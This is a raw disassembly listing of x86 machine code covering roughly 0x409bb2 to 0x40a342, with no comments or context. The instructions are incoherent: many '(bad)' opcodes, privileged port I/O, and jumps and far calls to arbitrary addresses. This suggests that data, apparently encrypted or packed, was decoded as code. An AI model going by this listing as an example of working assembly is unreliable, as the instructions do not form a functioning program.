  409bb2:	test   BYTE PTR [ecx-0x3c3dadb0],dh
  409bb8:	jle    0x409b7c
  409bba:	xacquire xchg DWORD PTR [eax+0x33],esi
  409bbe:	ss retf 
  409bc0:	xchg   BYTE PTR [edi+eiz*4+0x2c2eb2fe],dh
  409bc7:	push   eax
  409bc8:	xchg   DWORD PTR [esp+ebx*8-0x15658059],edi
  409bcf:	ret    
  409bd0:	pushf  
  409bd1:	pop    eax
  409bd2:	or     ebx,edx
  409bd4:	or     eax,0x5fc643fc
  409bd9:	push   ebx
  409bda:	xchg   esp,eax
  409bdb:	dec    edi
  409bdc:	bound  edx,QWORD PTR [ebx+0x2cd1a8f7]
  409be2:	ror    BYTE PTR [edx-0x2a4df6c0],0x6d
  409be9:	adc    cl,dh
  409beb:	jo     0x409c51
  409bed:	enter  0x5cdf,0x53
  409bf1:	nop
  409bf2:	rcl    DWORD PTR [ecx+0x407755f],1
  409bf8:	int3   
  409bf9:	imul   edx,esi,0x6b8aa4e9
  409bff:	test   BYTE PTR [ebp+0x43],0xf8
  409c03:	stos   BYTE PTR es:[edi],al
  409c04:	rcr    BYTE PTR ds:0x4e182d7b,0x5d
  409c0b:	sub    eax,0xec905e47
  409c10:	loopne 0x409ba1
  409c12:	add    BYTE PTR [esi-0x49],0x21
  409c16:	xchg   edi,eax
  409c17:	stos   DWORD PTR es:[edi],eax
  409c18:	in     eax,0xeb
  409c1a:	inc    ebp
  409c1b:	xor    BYTE PTR [edx],al
  409c1d:	rcl    BYTE PTR [ebx+0x1],0x7c
  409c21:	js     0x409ca1
  409c23:	add    al,0xe3
  409c25:	cmp    ch,BYTE PTR [edi]
  409c27:	push   esi
  409c28:	push   esi
  409c29:	loope  0x409ca6
  409c2b:	or     ah,ch
  409c2d:	int    0xb0
  409c2f:	pop    ebx
  409c30:	aam    0x49
  409c32:	or     DWORD PTR [eax-0xf],esi
  409c35:	jns    0x409bcb
  409c37:	cmp    edi,edx
  409c39:	in     al,0xe7
  409c3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c3c:	scas   al,BYTE PTR es:[edi]
  409c3d:	js     0x409c96
  409c3f:	ret    0xa2d0
  409c42:	xchg   edx,eax
  409c43:	sub    eax,0x9f9cbc28
  409c48:	dec    esp
  409c49:	ret    
  409c4a:	scas   eax,DWORD PTR es:[edi]
  409c4b:	pushf  
  409c4c:	push   es
  409c4d:	sbb    DWORD PTR ds:0xb4309d24,ecx
  409c53:	sub    BYTE PTR ds:0x67d2db2f,0x26
  409c5a:	jl     0x409be2
  409c5c:	or     ah,dl
  409c5e:	sbb    eax,0xc374165f
  409c63:	mov    al,ds:0x72a39c5c
  409c68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c69:	dec    ebp
  409c6a:	inc    esi
  409c6b:	mov    al,0xc3
  409c6d:	bound  edi,QWORD PTR [esi-0x5fca77b6]
  409c73:	(bad)  
  409c74:	in     eax,dx
  409c75:	call   0xb332:0x12d63422
  409c7c:	clc    
  409c7d:	test   BYTE PTR [ecx+eiz*4+0x48f94c4b],ah
  409c84:	cld    
  409c85:	or     ecx,DWORD PTR [edi]
  409c87:	in     eax,dx
  409c88:	push   0x11
  409c8a:	push   0x13
  409c8c:	and    DWORD PTR [esi],eax
  409c8e:	pop    eax
  409c8f:	sbb    al,0x49
  409c91:	push   ebp
  409c92:	dec    esi
  409c93:	pop    ebp
  409c94:	cmp    eax,0x4dd7253
  409c99:	xchg   ebp,eax
  409c9a:	les    esp,FWORD PTR [esi]
  409c9c:	jle    0x409c40
  409c9e:	add    ecx,eax
  409ca0:	iret   
  409ca1:	pop    esi
  409ca2:	test   BYTE PTR [eax+0x4d],0x0
  409ca6:	std    
  409ca7:	paddsb mm0,QWORD PTR [esi+0x5]
  409cab:	or     al,0x85
  409cad:	mov    edi,0x82c6a7bb
  409cb2:	mov    edi,0xc36a0b8d
  409cb7:	inc    ecx
  409cb8:	icebp  
  409cb9:	inc    ecx
  409cba:	jbe    0x409ca4
  409cbc:	and    BYTE PTR [edx-0x41aeadfd],bh
  409cc2:	aas    
  409cc3:	(bad)  
  409cc5:	pop    esi
  409cc6:	adc    BYTE PTR [eiz*2-0x40d4c11d],bh
  409ccd:	fadd   st(1),st
  409ccf:	bound  esp,QWORD PTR [ebx]
  409cd1:	cmp    DWORD PTR [edi+0x7698e2d2],ecx
  409cd7:	fisubr DWORD PTR [esi+0x2cd4170d]
  409cdd:	clc    
  409cde:	jecxz  0x409cfd
  409ce0:	inc    ebp
  409ce1:	push   esp
  409ce2:	inc    ebp
  409ce3:	aad    0xd1
  409ce5:	jle    0x409c96
  409ce7:	repnz ror esp,1
  409cea:	or     DWORD PTR [ecx-0x5e],ebp
  409ced:	cmp    eax,0x95d6ab6e
  409cf2:	add    eax,0x19367713
  409cf7:	sbb    ebp,esp
  409cf9:	lgs    edx,FWORD PTR [ebp+0x898f732]
  409d00:	shl    BYTE PTR [edx],1
  409d02:	retf   0x29b7
  409d05:	(bad)  
  409d06:	mov    edi,0xc061a206
  409d0b:	rcr    BYTE PTR [ebx],cl
  409d0d:	or     eax,0xd6f69bfb
  409d12:	xchg   esp,eax
  409d13:	mov    ch,0x4d
  409d15:	sbb    DWORD PTR [edx+0x75],0x7b
  409d19:	cdq    
  409d1a:	out    dx,al
  409d1b:	jg     0x409c9f
  409d1d:	push   ebx
  409d1e:	push   ds
  409d1f:	retf   
  409d20:	cs lock ret 0xad81
  409d25:	inc    esp
  409d26:	hlt    
  409d27:	push   ds
  409d28:	sub    ecx,DWORD PTR [esp+edi*2]
  409d2b:	cmp    al,0x7c
  409d2d:	shr    cl,1
  409d2f:	cmp    eax,0x3487f8c3
  409d34:	xchg   BYTE PTR [edx-0x5452297c],bh
  409d3a:	xor    esi,ebx
  409d3c:	leave  
  409d3d:	cli    
  409d3e:	xchg   ebp,eax
  409d3f:	cmp    edx,ebp
  409d41:	pop    esp
  409d42:	jg     0x409cd3
  409d44:	aas    
  409d45:	pop    ds
  409d46:	sub    edx,DWORD PTR [edi]
  409d48:	jmp    0xf3945c8c
  409d4d:	std    
  409d4e:	dec    ecx
  409d4f:	push   0x36
  409d51:	lahf   
  409d52:	add    DWORD PTR [edx],0xc842b3d0
  409d58:	cmp    BYTE PTR [esi],ah
  409d5a:	call   0x73b:0xc73e9be9
  409d61:	jbe    0x409d21
  409d63:	in     al,dx
  409d64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d65:	not    DWORD PTR [edi+edi*8+0x38daa47a]
  409d6c:	out    dx,eax
  409d6d:	lahf   
  409d6e:	or     BYTE PTR [ebx-0x1ea45285],bl
  409d74:	int    0x58
  409d76:	add    ch,BYTE PTR [ebx]
  409d78:	popa   
  409d79:	leave  
  409d7a:	cld    
  409d7b:	dec    esp
  409d7c:	mov    BYTE PTR [edi],dh
  409d7e:	and    BYTE PTR [eax],cl
  409d80:	sar    DWORD PTR [ebp-0x19b006f0],cl
  409d86:	test   DWORD PTR [edx-0x25],ebp
  409d89:	sub    ecx,DWORD PTR [esp+ebx*2]
  409d8c:	int    0x6
  409d8e:	cmc    
  409d8f:	jle    0x409d30
  409d91:	in     al,0x81
  409d93:	js     0x409dbc
  409d95:	sbb    BYTE PTR [edi+0x5af1bc7d],cl
  409d9b:	or     BYTE PTR [edx],0x51
  409d9e:	fldcw  WORD PTR [esi+0x4c7de788]
  409da4:	and    BYTE PTR [edi],dl
  409da6:	stos   BYTE PTR es:[edi],al
  409da7:	mov    WORD PTR [eax],ss
  409da9:	cwde   
  409daa:	(bad)  
  409dab:	cmp    al,0xae
  409dad:	ins    BYTE PTR es:[edi],dx
  409dae:	loop   0x409dc6
  409db0:	popa   
  409db1:	(bad)  
  409db2:	scas   eax,DWORD PTR es:[edi]
  409db3:	push   es
  409db4:	and    al,ah
  409db6:	xchg   cl,ah
  409db8:	call   0x77ff8201
  409dbd:	call   0xffb52dbc
  409dc2:	stos   DWORD PTR es:[edi],eax
  409dc3:	xor    esi,edx
  409dc5:	sar    BYTE PTR [edi-0x45],cl
  409dc8:	mov    ch,0xdc
  409dca:	(bad)  
  409dcb:	out    dx,eax
  409dcc:	dec    ebp
  409dcd:	xor    cl,bl
  409dcf:	mov    eax,0xc967916e
  409dd4:	int3   
  409dd5:	xchg   ecx,eax
  409dd6:	cmc    
  409dd7:	fisub  DWORD PTR [ebx+0x1d]
  409dda:	jge    0x409e4c
  409ddc:	iret   
  409ddd:	ret    0xd167
  409de0:	scas   eax,DWORD PTR es:[edi]
  409de1:	add    edi,0x19c911d7
  409de7:	sar    DWORD PTR [edi+edi*2+0x24],1
  409deb:	inc    edi
  409dec:	sub    cl,BYTE PTR [ebx+0x49]
  409def:	cmp    al,0x28
  409df1:	jmp    0xba1d316a
  409df6:	xchg   ecx,eax
  409df7:	retf   
  409df8:	(bad)  
  409df9:	mov    dh,0x92
  409dfb:	in     al,0xd3
  409dfd:	or     eax,0x3e7bbf52
  409e02:	mov    al,ds:0x4a93dfce
  409e07:	cmp    DWORD PTR [ecx-0x2f8fe4bb],esp
  409e0d:	mov    eax,0xbf4ec5b5
  409e12:	jp     0x409da4
  409e14:	jo     0x409de6
  409e16:	js     0x409e2a
  409e18:	jmp    0x230a:0x84cadce2
  409e1f:	and    al,0x55
  409e21:	pop    esp
  409e22:	adc    eax,0x3dde2579
  409e27:	and    DWORD PTR [ecx+esi*8-0x11],edi
  409e2b:	hlt    
  409e2c:	mov    esi,0x17ee5c06
  409e31:	inc    edi
  409e32:	sti    
  409e33:	jae    0x409e77
  409e35:	add    edx,eax
  409e37:	inc    ebp
  409e38:	adc    BYTE PTR [edi+0x40],0xd8
  409e3c:	xor    ah,BYTE PTR [ecx-0x35]
  409e3f:	inc    eax
  409e40:	adc    DWORD PTR [ecx],edx
  409e42:	repz xchg edi,eax
  409e44:	jge    0x409e21
  409e46:	shl    BYTE PTR ds:0x87121170,1
  409e4c:	sub    ah,BYTE PTR [edi]
  409e4e:	adc    BYTE PTR [eax+eax*4+0x56faa154],dl
  409e55:	outs   dx,DWORD PTR ds:[esi]
  409e56:	push   ebx
  409e57:	mov    ch,0x54
  409e59:	xchg   edi,eax
  409e5a:	hlt    
  409e5b:	(bad)  
  409e5c:	leave  
  409e5d:	cs push es
  409e5f:	push   cs
  409e60:	popa   
  409e61:	or     BYTE PTR [esi],ah
  409e63:	xchg   esp,eax
  409e64:	cmp    esi,edi
  409e66:	retf   
  409e67:	dec    eax
  409e68:	mov    dh,0x79
  409e6a:	lods   eax,DWORD PTR ds:[esi]
  409e6b:	push   esp
  409e6c:	cmp    dl,BYTE PTR [ecx-0x73]
  409e6f:	push   es
  409e70:	sbb    DWORD PTR [ebx-0x6c885951],edi
  409e76:	cmp    al,0xaf
  409e78:	fistp  DWORD PTR [esi+esi*1+0x4ed0e6ae]
  409e7f:	xchg   BYTE PTR [ecx+0x66],dl
  409e82:	or     esp,DWORD PTR [esi]
  409e84:	cmc    
  409e85:	push   edx
  409e86:	jmp    0xb5162a3f
  409e8b:	cmp    eax,0xab00d22d
  409e90:	mov    eax,ds:0x92b920d9
  409e95:	push   edi
  409e96:	fidiv  WORD PTR [esi+0x4e39fb12]
  409e9c:	aad    0xf5
  409e9e:	jo     0x409eea
  409ea0:	inc    esp
  409ea1:	(bad)  
  409ea2:	cmc    
  409ea3:	(bad)  
  409ea4:	loopne 0x409f07
  409ea6:	mov    edi,0xbc98e401
  409eab:	cdq    
  409eac:	mov    dh,al
  409eae:	pop    DWORD PTR [ecx]
  409eb0:	lods   eax,DWORD PTR ds:[esi]
  409eb1:	daa    
  409eb2:	into   
  409eb3:	scas   al,BYTE PTR es:[edi]
  409eb4:	imul   eax,eax,0xd269a7ca
  409eba:	jmp    0x1afe:0x4b96e747
  409ec1:	adc    BYTE PTR [ebx+0x22421c82],dh
  409ec7:	mov    ds:0xa2149afc,al
  409ecc:	push   esp
  409ecd:	cmp    BYTE PTR [ecx-0x4e4c1a1a],al
  409ed3:	pop    ss
  409ed4:	pop    eax
  409ed5:	fwait
  409ed6:	sub    al,0x6f
  409ed8:	jge    0x409f2b
  409eda:	inc    edx
  409edb:	xchg   esp,eax
  409edc:	sub    al,0x13
  409ede:	aas    
  409edf:	mul    DWORD PTR [edi-0x2a0d1d2a]
  409ee5:	scas   eax,DWORD PTR es:[edi]
  409ee6:	fisub  WORD PTR [ecx]
  409ee8:	loope  0x409ef3
  409eea:	mov    dl,0xb9
  409eec:	mov    ebx,0x6c95efe9
  409ef1:	mov    eax,ecx
  409ef3:	scas   al,BYTE PTR es:[edi]
  409ef4:	and    al,0x4
  409ef6:	xor    ebx,ebp
  409ef8:	and    BYTE PTR [edi+0x47b0133f],ah
  409efe:	mov    esp,0xbafcf798
  409f03:	lock mov fs,WORD PTR ds:0x78a3252f
  409f0a:	rol    DWORD PTR [ecx+0x54],cl
  409f0d:	jecxz  0x409f3e
  409f0f:	sbb    BYTE PTR [eax],dl
  409f11:	adc    al,0x48
  409f13:	jl     0x409e98
  409f15:	cmp    BYTE PTR [ecx-0x3133649d],0xb8
  409f1c:	ds jnp 0x409eb4
  409f1f:	shl    DWORD PTR [ecx+0x45e34c5],0x86
  409f26:	jae    0x409ec0
  409f28:	ror    BYTE PTR [ebx+0x7470a48f],1
  409f2e:	les    ebp,FWORD PTR [ecx-0x5c62244]
  409f34:	jb     0x409fb3
  409f36:	inc    esi
  409f37:	xchg   ebp,eax
  409f38:	cmp    al,0x72
  409f3a:	lock and DWORD PTR [esi+0x67],eax
  409f3e:	cmp    DWORD PTR [ecx],esi
  409f40:	popf   
  409f41:	and    BYTE PTR [ebx+0x3],bh
  409f44:	test   BYTE PTR [edx-0x64],0xfd
  409f48:	nop
  409f49:	jo     0x409f56
  409f4b:	popf   
  409f4c:	repz xchg esi,eax
  409f4e:	rol    esp,1
  409f50:	inc    eax
  409f51:	add    dl,dh
  409f53:	aam    0x75
  409f55:	aas    
  409f56:	dec    esp
  409f57:	inc    ebx
  409f58:	mov    bh,0x65
  409f5a:	fld    DWORD PTR [eax+0x5c]
  409f5d:	mov    esi,0x6547edb6
  409f62:	jecxz  0x409f17
  409f64:	aam    0xc3
  409f66:	push   ecx
  409f67:	jo     0x409f60
  409f69:	inc    ebx
  409f6a:	stc    
  409f6b:	mov    ah,0xea
  409f6d:	lahf   
  409f6e:	imul   esi,edi,0x51
  409f71:	xchg   DWORD PTR [ebp+ebp*1-0x36],edx
  409f75:	mov    esp,0x73e43b50
  409f7a:	xchg   ebx,eax
  409f7b:	push   ss
  409f7c:	retf   0x781
  409f7f:	sub    dl,BYTE PTR [esi-0x48a6e879]
  409f85:	sbb    DWORD PTR [ebp+0x64],eax
  409f88:	sbb    BYTE PTR [ebx-0x72802ad2],0x85
  409f8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f90:	ins    BYTE PTR es:[edi],dx
  409f91:	ins    DWORD PTR es:[edi],dx
  409f92:	fwait
  409f93:	loopne 0x40a009
  409f95:	pop    ds
  409f96:	fcomip st,st(5)
  409f98:	jecxz  0x409f74
  409f9a:	sar    BYTE PTR [ecx-0x699938be],1
  409fa0:	jmp    0x9e0bbf5f
  409fa5:	xor    DWORD PTR [esi+0x1c],ecx
  409fa8:	shl    DWORD PTR [edi+ebp*8-0x639a9bb],0x4d
  409fb0:	or     ebx,ebp
  409fb2:	sub    al,0xb0
  409fb4:	pop    ss
  409fb5:	pop    ebx
  409fb6:	test   al,0x78
  409fb8:	shl    DWORD PTR [ebx+0x2],0xa3
  409fbc:	es in  al,0x37
  409fbf:	pop    ebp
  409fc0:	stc    
  409fc1:	daa    
  409fc2:	sti    
  409fc3:	push   ss
  409fc4:	stc    
  409fc5:	loope  0x40a014
  409fc7:	cs jle 0x409f91
  409fca:	jle    0x409ffc
  409fcc:	(bad)  [eax]
  409fce:	sahf   
  409fcf:	pop    esi
  409fd0:	dec    edi
  409fd1:	inc    eax
  409fd2:	mov    ebp,0xc1adbf5e
  409fd7:	push   0xffffffa8
  409fd9:	shl    DWORD PTR [esi-0x3b],0x84
  409fdd:	test   al,0xe6
  409fdf:	(bad)  
  409fe0:	(bad)  
  409fe2:	hlt    
  409fe3:	xor    dh,BYTE PTR [ebx*8-0x7012310]
  409fea:	jne    0x40a067
  409fec:	or     esp,DWORD PTR [ecx-0x1]
  409fef:	cmp    DWORD PTR [edi+0x5547f902],ecx
  409ff5:	fwait
  409ff6:	xlat   BYTE PTR ds:[ebx]
  409ff7:	sbb    al,0x51
  409ff9:	fsub   DWORD PTR [ebx+0x636eadd4]
  409fff:	jb     0x409f8a
  40a001:	cmp    al,BYTE PTR [edi-0x4b2983f3]
  40a007:	(bad)  
  40a008:	int    0x37
  40a00a:	(bad)  
  40a00b:	in     eax,dx
  40a00c:	loopne 0x40a029
  40a00e:	ins    DWORD PTR es:[edi],dx
  40a00f:	ror    BYTE PTR [ecx+ebx*4-0x26],cl
  40a013:	xor    DWORD PTR [eax+0x62b2c6bc],0x12
  40a01a:	push   eax
  40a01b:	push   eax
  40a01c:	jmp    0xb75d:0x6a88740a
  40a023:	add    esp,ecx
  40a025:	push   ds
  40a026:	jns    0x409fb6
  40a028:	loope  0x409fc4
  40a02a:	xchg   edx,eax
  40a02b:	lea    ebx,[esp+eiz*4+0x6]
  40a02f:	mov    edx,0xfe0d29a8
  40a034:	mov    ah,0xd4
  40a036:	cmp    BYTE PTR [ebp-0x1d9c1340],0x7c
  40a03d:	movzx  ebx,WORD PTR [eax+0x1d]
  40a041:	adc    al,0xc1
  40a043:	mov    eax,ds:0xdcc17466
  40a048:	sub    eax,0xc148c1f8
  40a04d:	(bad)  
  40a04e:	cs test cl,0x4f
  40a052:	in     eax,dx
  40a053:	pusha  
  40a054:	or     edx,DWORD PTR [ebp-0x1bbc24e2]
  40a05a:	into   
  40a05b:	pop    esp
  40a05c:	cli    
  40a05d:	jb     0x40a05b
  40a05f:	lods   al,BYTE PTR ds:[esi]
  40a060:	xchg   edx,eax
  40a061:	dec    esp
  40a062:	data16 cmp BYTE PTR [ebx-0x14dccf34],0x4
  40a06a:	call   DWORD PTR [eax]
  40a06c:	repnz (bad) 
  40a06f:	call   0x2a54d9ed
  40a074:	add    BYTE PTR [edx],ch
  40a076:	add    eax,0x406a71e3
  40a07b:	add    al,0x9a
  40a07d:	(bad)  
  40a07e:	loopne 0x40a0c3
  40a080:	pop    esi
  40a081:	mov    WORD PTR [ebp+0x302df59e],fs
  40a087:	jp     0x40a0e7
  40a089:	ss pop edi
  40a08b:	outs   dx,DWORD PTR ds:[esi]
  40a08c:	test   eax,0x47127db9
  40a091:	xor    esp,0xad9907ac
  40a097:	fwait
  40a098:	xor    cl,BYTE PTR [eax+0x75]
  40a09b:	or     BYTE PTR [edx+0x457b2501],bl
  40a0a1:	test   BYTE PTR ds:0xd26f24cd,dh
  40a0a7:	(bad)  
  40a0a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0a9:	fst    QWORD PTR [ebx+0x49590712]
  40a0af:	fisub  WORD PTR ds:0xa8cdb37b
  40a0b5:	and    BYTE PTR ds:0x875ca736,ah
  40a0bb:	sub    edi,DWORD PTR [ebx-0x2b]
  40a0be:	push   0xffffffda
  40a0c0:	sub    edi,DWORD PTR [ecx+eax*1]
  40a0c3:	lods   eax,DWORD PTR ds:[esi]
  40a0c4:	push   ecx
  40a0c5:	pop    edx
  40a0c6:	pop    ecx
  40a0c7:	xor    esi,esp
  40a0c9:	(bad)  
  40a0ca:	jns    0x40a051
  40a0cc:	and    DWORD PTR [eax-0x5],esp
  40a0cf:	es fwait
  40a0d1:	fwait
  40a0d2:	xor    eax,0xe6e90c2a
  40a0d7:	adc    BYTE PTR [edx+0x2b8c8d15],bh
  40a0dd:	neg    ebp
  40a0df:	dec    eax
  40a0e0:	xchg   DWORD PTR [eax-0x34ca8df7],edi
  40a0e6:	out    dx,eax
  40a0e7:	ror    edi,cl
  40a0e9:	jae    0x40a0ce
  40a0eb:	sub    ah,BYTE PTR [esi+0x51]
  40a0ee:	jp     0x40a0b4
  40a0f0:	out    dx,eax
  40a0f1:	in     al,dx
  40a0f2:	js     0x40a07a
  40a0f4:	fiadd  WORD PTR [eax-0x30efcebc]
  40a0fa:	out    dx,al
  40a0fb:	mov    ds:0x7c99bdb0,al
  40a100:	scas   al,BYTE PTR es:[edi]
  40a101:	enter  0x19d0,0xb
  40a105:	jl     0x40a0ec
  40a107:	das    
  40a108:	mov    esi,0x2de1cff3
  40a10d:	icebp  
  40a10e:	out    dx,eax
  40a10f:	pop    es
  40a110:	mov    ebx,ss
  40a112:	mov    WORD PTR [ecx-0x490d33bf],fs
  40a118:	xor    DWORD PTR [edi-0x5b],ecx
  40a11b:	lods   eax,DWORD PTR ds:[esi]
  40a11c:	ds (bad) 
  40a11e:	jl     0x40a0bb
  40a120:	mov    al,0x9e
  40a122:	pop    esp
  40a123:	sbb    al,0x14
  40a125:	or     al,0x52
  40a127:	daa    
  40a128:	cmp    ebx,DWORD PTR [eax+0x5df329d6]
  40a12e:	xchg   edi,edi
  40a130:	imul   ecx,DWORD PTR [ebx-0x4e],0xe4e28e8a
  40a137:	rol    edi,1
  40a139:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a13a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a13b:	aas    
  40a13c:	in     al,dx
  40a13d:	jp     0x40a12e
  40a13f:	mov    esi,0x4fc8ed78
  40a144:	sub    al,0xa
  40a146:	mov    esi,0x2c1a6ed9
  40a14b:	adc    esi,DWORD PTR [ecx+0x1755bebc]
  40a151:	scas   al,BYTE PTR es:[edi]
  40a152:	push   0x60fc300d
  40a157:	push   ecx
  40a158:	ins    DWORD PTR es:[edi],dx
  40a159:	add    eax,0x1f665b8c
  40a15e:	pop    ss
  40a15f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a160:	icebp  
  40a161:	imul   BYTE PTR [eax]
  40a163:	sub    eax,0xae30d905
  40a168:	xchg   edx,eax
  40a169:	mov    ah,BYTE PTR [ebx+0x66]
  40a16c:	add    ah,cl
  40a16e:	out    dx,al
  40a16f:	pop    ds
  40a170:	jae    0x40a138
  40a172:	dec    esp
  40a173:	mov    es,WORD PTR [ebx-0x55]
  40a176:	xchg   esi,eax
  40a177:	jl     0x40a1a0
  40a179:	into   
  40a17a:	bound  ebx,QWORD PTR [bx+si]
  40a17d:	aas    
  40a17e:	xlat   BYTE PTR ds:[ebx]
  40a17f:	mov    ebp,0xc8fcc939
  40a184:	push   ss
  40a185:	jne    0x40a138
  40a187:	retf   0x6996
  40a18a:	test   DWORD PTR [edi+0x4a],ebp
  40a18d:	fucom  st(7)
  40a18f:	pushf  
  40a190:	inc    edx
  40a191:	or     edi,DWORD PTR [ecx]
  40a193:	lock pop ss
  40a195:	daa    
  40a196:	bound  esi,QWORD PTR [eax]
  40a198:	int    0xe4
  40a19a:	pop    ebx
  40a19b:	(bad)  [eax]
  40a19d:	dec    esi
  40a19e:	inc    edi
  40a19f:	lock xor al,BYTE PTR [esi+0x34]
  40a1a3:	xor    al,0xfd
  40a1a5:	dec    ebp
  40a1a6:	ins    BYTE PTR es:[edi],dx
  40a1a7:	xor    esi,ecx
  40a1a9:	pushf  
  40a1aa:	jo     0x40a1f8
  40a1ac:	stc    
  40a1ad:	xchg   edi,eax
  40a1ae:	in     al,dx
  40a1af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1b0:	cmp    DWORD PTR [eax-0x70531fbb],ecx
  40a1b6:	cmp    al,0xc3
  40a1b8:	js     0x40a18e
  40a1ba:	repz dec edx
  40a1bc:	shl    esp,1
  40a1be:	sub    DWORD PTR ds:0xe7d62bb0,ebx
  40a1c5:	and    eax,0x74b90343
  40a1ca:	sahf   
  40a1cb:	sti    
  40a1cc:	xchg   ebx,eax
  40a1cd:	mov    dl,BYTE PTR [ecx-0x4230dd25]
  40a1d3:	outs   dx,BYTE PTR ds:[esi]
  40a1d4:	mov    ebp,0xbe706c6a
  40a1d9:	cmc    
  40a1da:	ss leave 
  40a1dc:	adc    al,0xa3
  40a1df:	dec    esp
  40a1e0:	dec    esi
  40a1e1:	je     0x40a23a
  40a1e3:	mov    al,ds:0x33e51124
  40a1e8:	out    dx,al
  40a1e9:	or     DWORD PTR [esi-0xd],edi
  40a1ec:	mov    esi,edx
  40a1ee:	shl    DWORD PTR [ebp+0x5f],cl
  40a1f1:	mov    dh,0x30
  40a1f3:	inc    eax
  40a1f4:	jne    0x40a1c8
  40a1f6:	mov    ds:0xec1fa0df,al
  40a1fb:	jb     0x40a1e1
  40a1fd:	inc    edi
  40a1fe:	inc    ebp
  40a1ff:	retf   0x67cc
  40a202:	xchg   edi,eax
  40a203:	cmp    eax,0x43c17f67
  40a208:	sbb    BYTE PTR [eax-0x125765b2],0x2f
  40a20f:	cmp    eax,0x412a026e
  40a214:	test   BYTE PTR [ecx],0x8e
  40a217:	jl     0x40a1f5
  40a219:	call   0x8548:0x3f4547bb
  40a220:	mov    al,ds:0x2e1cdf30
  40a225:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a226:	lods   al,BYTE PTR ds:[esi]
  40a227:	into   
  40a228:	test   DWORD PTR [ebx-0x566a08be],0x16e2f8c2
  40a232:	loop   0x40a29d
  40a234:	je     0x40a28b
  40a236:	mov    ebp,0x7760d7fa
  40a23b:	in     eax,0x14
  40a23d:	xchg   esi,eax
  40a23e:	fistp  DWORD PTR [eax+ebx*4]
  40a241:	lea    eax,[ebx]
  40a243:	out    0x7c,al
  40a245:	cli    
  40a246:	mov    al,BYTE PTR ds:0x7cd1573f
  40a24c:	pop    edi
  40a24d:	dec    ebp
  40a24e:	scas   eax,DWORD PTR es:[edi]
  40a24f:	scas   al,BYTE PTR es:[edi]
  40a250:	xchg   esi,eax
  40a251:	ins    BYTE PTR es:[edi],dx
  40a252:	push   0x1d45126b
  40a257:	outs   dx,BYTE PTR ds:[esi]
  40a258:	pop    ss
  40a259:	out    dx,al
  40a25a:	pop    es
  40a25b:	pop    ecx
  40a25c:	cmp    al,0x5a
  40a25e:	or     ebp,DWORD PTR [eax+0x63]
  40a261:	xchg   esi,eax
  40a262:	ror    BYTE PTR [edx],0x86
  40a265:	cmp    al,0xee
  40a267:	sub    DWORD PTR [edi-0x6a],ebx
  40a26a:	shr    dh,1
  40a26c:	inc    esi
  40a26d:	in     eax,0xdf
  40a26f:	(bad)  
  40a270:	lds    edx,FWORD PTR [ecx+0x42]
  40a273:	sbb    al,BYTE PTR [edx]
  40a275:	sbb    edx,DWORD PTR cs:[esi]
  40a278:	nop
  40a279:	addr16 out dx,eax
  40a27b:	stc    
  40a27c:	outs   dx,DWORD PTR cs:[esi]
  40a27e:	mov    ecx,0xceac713d
  40a283:	in     al,dx
  40a284:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a285:	sahf   
  40a286:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a287:	jecxz  0x40a297
  40a289:	and    eax,DWORD PTR [ecx+esi*4-0x4c]
  40a28d:	mov    eax,0x68d9c64c
  40a292:	pop    eax
  40a293:	fisubr WORD PTR [ebx]
  40a295:	jmp    0x40a28d
  40a297:	jo     0x40a2fe
  40a299:	into   
  40a29a:	fisubr WORD PTR [edi-0x5bc230ca]
  40a2a0:	mov    bh,0x67
  40a2a2:	sub    eax,0x963c16bd
  40a2a7:	xor    eax,0xa360c879
  40a2ac:	sub    DWORD PTR [edx-0x5e],ebx
  40a2af:	shr    dh,cl
  40a2b1:	cs cmc 
  40a2b3:	jnp    0x40a327
  40a2b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2b6:	ss add eax,0xb0d3000f
  40a2bc:	(bad)  
  40a2be:	mov    dh,0x8a
  40a2c0:	in     eax,0x88
  40a2c2:	dec    edi
  40a2c3:	clc    
  40a2c4:	ret    
  40a2c5:	out    dx,eax
  40a2c6:	xor    eax,0x2f537b5b
  40a2cb:	icebp  
  40a2cc:	rcl    ecx,0xd2
  40a2cf:	sbb    DWORD PTR [esi+0x30],0x7c6bbe16
  40a2d6:	or     BYTE PTR [ebx],dl
  40a2d8:	fwait
  40a2d9:	pusha  
  40a2da:	sub    BYTE PTR ds:0x60187400,ch
  40a2e0:	not    DWORD PTR [edx+0xc]
  40a2e3:	mov    edx,gs
  40a2e5:	and    BYTE PTR [eax-0x17c05c9f],bh
  40a2eb:	shl    DWORD PTR [edx],0x79
  40a2ee:	call   0xb2b1e24d
  40a2f3:	cli    
  40a2f4:	hlt    
  40a2f5:	lods   eax,DWORD PTR ds:[esi]
  40a2f6:	inc    ecx
  40a2f7:	mov    ecx,0x262686e9
  40a2fc:	adc    ch,al
  40a2fe:	loope  0x40a36d
  40a300:	and    BYTE PTR [eax-0x27],bl
  40a303:	xchg   esi,eax
  40a304:	data16 rol bh,0x8c
  40a308:	xchg   al,al
  40a30a:	push   es
  40a30b:	xchg   esi,eax
  40a30c:	or     eax,DWORD PTR [ebx+0x7efb0fa6]
  40a312:	cmc    
  40a313:	mov    ebp,0x218c91f
  40a318:	add    dl,BYTE PTR [edi]
  40a31a:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a31c:	fistp  DWORD PTR [edx]
  40a31e:	mov    al,dl
  40a320:	das    
  40a321:	or     dl,BYTE PTR [edi-0x42a9cad3]
  40a327:	jl     0x40a2e7
  40a329:	mul    DWORD PTR [eax+eax*2+0x620e8b50]
  40a330:	sub    DWORD PTR [eax+0x11832a78],0xffffff96
  40a337:	inc    ebx
  40a338:	call   0x4eec:0x697a8b38
  40a33f:	push   edx
  40a340:	loope  0x40a31b
  40a342:	inc    esi
